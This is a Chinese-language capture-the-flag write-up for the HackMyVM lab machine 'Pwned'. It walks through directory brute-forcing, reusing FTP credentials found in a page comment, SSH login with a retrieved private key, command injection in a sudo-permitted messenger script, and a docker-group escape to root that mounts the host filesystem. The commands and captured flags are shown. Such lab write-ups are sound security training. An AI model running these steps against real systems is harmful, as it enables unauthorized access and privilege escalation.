# Pwned

2024-11-08 https://hackmyvm.eu/machines/machine.php?vm=Pwned

## IP

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 不能匿名登陆，先看 80 web 服务。gobuster 使用大字典 /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt 扫描出 1 个目录 /nothing 但是什么都没有，还有一个目录 hidden_text 里面有个文件 secret.dic，将此文件作为字典，再次 gobuster 扫描，发现另一个目录： http://192.168.5.39/pwned.vuln/ 查看源码，发现登陆用户名和密码：

```
<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//		echo "welcome"
//		exit();
// }
// else
//	echo "Invalid creds"
// }
?>
```

尝试登陆没有作用，前面还有个 ftp 使用此用户名和密码登陆 ftp，登陆成功。在其中发现 share 目录，在其中有 id_rsa 和 note.txt ，note.txt 中有一个用户名，把 id_rsa 下载，使用 ssh 进行登陆：

```
ssh -i id_rsa ariana@192.168.5.39
```

得到了 user flag：

```
ariana@pwned:~$ cat user1.txt
congratulations you Pwned ariana

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

寻找提权 root 路径，sudo -l 发现：

```
(selena) NOPASSWD: /home/messenger.sh
```

需要先提权到 selena 用户，在这个脚本中在输入 msg 时存在系统命令注入`$msg 2> /dev/null`：

```
Enter username to send message : ariana

Enter message for ariana :/bin/bash

Sending message to ariana
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```

这时就得到了 selena 权限，在其 home 目录得到了第二个 flag：

```
cat user2.txt
711fdfc6caad532815a440f7f295c176

You are near to me. you found selena too.

Try harder to catch me
```

selena 属于 docker 用户组，这样就直接能挂载宿主机的 / 目录到 docker 中了：

```
docker images

docker run -v /:/mnt --rm -it a24bb4013296 chroot /mnt sh
```

直接拿到了 root flag：

```
# cat root.txt
4d4098d64e163d2726959455d046fd7c



You found me. i dont't expect this （◎ . ◎）

I am Ajay (Annlynn) i hacked your server left and this for you.

I trapped Ariana and Selena to takeover your server :)


You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation

Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g

Instgarm   ajs_walker

Twitter    Ajs_walker
```
